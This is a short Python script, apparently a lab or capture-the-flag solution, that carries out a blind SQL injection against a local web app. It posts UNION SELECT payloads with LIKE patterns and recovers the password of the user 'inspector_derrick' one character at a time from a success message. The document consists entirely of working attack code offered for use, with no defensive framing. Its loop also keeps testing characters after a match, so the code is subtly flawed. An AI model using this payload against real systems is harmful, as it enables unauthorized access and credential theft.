import requests
from bs4 import BeautifulSoup

URL = 'http://127.0.0.1/messages'
characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
password = ''

while True:
    found_letter = False
    for char in characters:
        data = {'name': "' UNION SELECT name,password FROM users WHERE name LIKE 'inspector_derrick' AND password LIKE '"
                + password + char + "%'#"}
        response = requests.post(URL, data)
        soup = BeautifulSoup(response.text, 'html.parser')
        myDivs = soup.findAll("div", {"class": "alert alert-success"})
        if myDivs:
            password += char
            found_letter = True
    if not found_letter:
        break

print(password)
